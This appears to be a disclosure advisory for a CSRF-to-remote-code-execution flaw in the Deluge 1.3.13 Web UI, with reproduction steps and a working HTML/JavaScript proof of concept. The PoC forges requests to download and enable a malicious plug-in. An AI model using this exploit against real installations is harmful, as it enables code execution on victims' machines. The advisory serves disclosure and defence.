@@ -1,0 +1,173 @@
+<!--
+Remote code execution via CSRF vulnerability in the web UI of Deluge 1.3.13
+
+Kyle Neideck, February 2017
+
+
+Product
+-------
+
+Deluge is a BitTorrent client available from http://deluge-torrent.org.
+
+Fix
+---
+
+Fixed in the (public) source code, but not in binary releases yet. See
+http://git.deluge-torrent.org/deluge/commit/?h=develop&id=11e8957deaf0c76fdfbac62d99c8b6c61cfdddf9
+and
+http://git.deluge-torrent.org/deluge/commit/?h=1.3-stable&id=318ab179865e0707d7945edc3a13a464a108d583
+
+Install from source or use the web UI from an incognito/private window until
+new binaries are released.
+
+Summary
+-------
+
+Deluge version 1.3.13 is vulnerable to cross-site request forgery in the Web UI
+plug-in resulting in remote code execution. Requests made to the /json endpoint
+are not checked for CSRF. See the "render" function of the "JSON" class in
+deluge/ui/web/json_api.py.
+
+The Web UI plug-in is installed, but not enabled, by default. If the user has
+enabled the Web UI plug-in and logged into it, a malicious web page can use
+forged requests to make Deluge download and install a Deluge plug-in provided
+by the attacker. The plug-in can then execute arbitrary code as the user
+running Deluge (usually the local user account).
+
+Timeline
+--------
+
+2017-03-01 Disclosed the vulnerability to Calum Lind (Cas) of Deluge Team
+2017-03-01 Vulnerability fixed by Calum Lind
+2017-03-05 Advisory released
+
+To Reproduce
+------------
+
+ - Create/find a Deluge plug-in to be installed on the victim machine. For
+   example, create an empty plug-in with
+       python deluge/scripts/create_plugin.py --name malicious --basepath . \
+           --author-name "n" --author-email "e"
+   (see
+   http://git.deluge-torrent.org/deluge/tree/deluge/scripts/create_plugin.py?h=1.3-stable&id=318ab179865e0707d7945edc3a13a464a108d583)
+   and add a line to its __init__.py to launch calc.exe.
+ - Build the plug-in as a .egg (if necessary):
+       python malicious/setup.py bdist_egg
+ - Make a torrent containing the .egg and seed it somewhere.
+ - Create a Magnet link for the torrent.
+ - In the proof-of-concept page below, update the PLUGIN_NAME, PLUGIN_FILE and
+   MAGNET_LINK constants.
+ - Put the PoC on a web server somewhere. Serving it locally is fine.
+ - In Deluge, open Preferences, go to the Plugins category and enable the Web
+   UI plug-in.
+ - Go to the WebUi preferences section and check "Enable web interface". The
+   port should be set to 8112 by default.
+ - If you're serving the PoC over HTTPS, check "Enable SSL" so its requests
+   don't get blocked as mixed content. If you're not, SSL can be enabled or
+   disabled.
+ - Go to localhost:8112 in a browser on the victim machine and log in.
+ - Open the PoC in the same browser.
+
+The PoC sends requests to localhost:8112 that include cookies. The first
+request adds the torrent, which downloads the .egg (the plug-in) to /tmp. It
+then sends repeated requests to install the .egg and enable it. The attacker's
+code in the plug-in runs when the plug-in is enabled.
+
+For the attack to be successful, the PoC page must be left open until the
+malicious plug-in finishes downloading. An attacker could avoid that limitation
+by using the Execute plug-in, which is installed by default, but Deluge has to
+be restarted before the Execute plug-in can be used. I don't think that can be
+done from the web UI, so the attacker's code would only execute after the
+victim restarted Deluge and then added/removed/completed a torrent.
+
+The PoC adds the plug-in torrent using a Magnet link because it would need to
+read the web UI's responses to add a .torrent file, which CORS prevents.
+
+Proof of Concept
+----------------
+-->
+
+<!--
+Deluge 1.3.13 Web UI CSRF
+
+Tested on Linux, macOS and Windows.
+
+Kyle Neideck, February 2017
+kyle@bearisdriving.com
+-->
+<html><body><script>
+let PLUGIN_NAME = 'malicious';
+let PLUGIN_FILE = 'malicious-0.1-py2.7.egg';
+let MAGNET_LINK =
+    'magnet:?xt=urn:btih:1b02570de69c0cb6d12c544126a32c67c79024b4' +
+        '&dn=malicious-0.1-py2.7.egg' +
+        '&tr=http%3A%2F%2Ftracker.example.com%3A6969%2Fannounce';
+
+function send_deluge_json(json) {
+    console.log('Sending: ' + json);
+
+    for (let proto of ['http','https']) {
+        let xhr = new XMLHttpRequest();
+
+        xhr.open('POST', proto + '://localhost:8112/json');
+        xhr.setRequestHeader('Content-Type', 'text/plain');
+        xhr.withCredentials = true;
+        xhr.onload = function() { console.log(xhr); };
+        xhr.send(json);
+    }
+}
+
+let download_location =
+    (navigator.appVersion.indexOf("Win") != -1) ?
+        'C:\\\\Users\\\\Public' : '/tmp';
+
+// Download a malicious plugin using a Magnet link.
+//
+// Using the /upload endpoint or adding a .torrent file wouldn't work. We could
+// upload the file (either a .torrent or the plug-in itself), but it would be
+// saved in a temp dir with a random name. CORS would prevent us from reading
+// the path to the file from the response, and to finish the process we'd need
+// to send a second request that includes that path.
+send_deluge_json('{' +
+    '"method":"web.add_torrents",' +
+    '"params":[[{' +
+        '"path":"' + MAGNET_LINK + '",' +
+        '"options":{' +
+            '"file_priorities":[],' +
+            '"add_paused":false,' +
+            '"compact_allocation":false,' +
+            '"download_location":"' + download_location + '",' +
+            '"move_completed":false,' +
+            '"move_completed_path":"' + download_location + '",' +
+            '"max_connections":-1,' +
+            '"max_download_speed":-1,' +
+            '"max_upload_slots":-1,' +
+            '"max_upload_speed":-1,' +
+            '"prioritize_first_last_pieces":false}}]],' +
+        '"id":12345}');
+
+window.stop = false;
+
+// Repeatedly try to enable the plugin, since we can't tell when it will finish
+// downloading.
+function try_to_add_and_enable_plugin() {
+    send_deluge_json('{' +
+        '"method":"web.upload_plugin",' +
+        '"params":["' + PLUGIN_FILE + '","' +
+            download_location + '/' + PLUGIN_FILE + '"],' +
+        '"id":12345}');
+
+    send_deluge_json('{' +
+        '"method":"core.enable_plugin",' +
+        '"params":["' + PLUGIN_NAME + '"],' +
+        '"id":12345}');
+
+    if (!window.stop) {
+        window.setTimeout(try_to_add_and_enable_plugin, 500);
+    }
+}
+
+try_to_add_and_enable_plugin();
+</script>
+<button onclick="window.stop = true">Stop sending requests</button>
+</body></html>
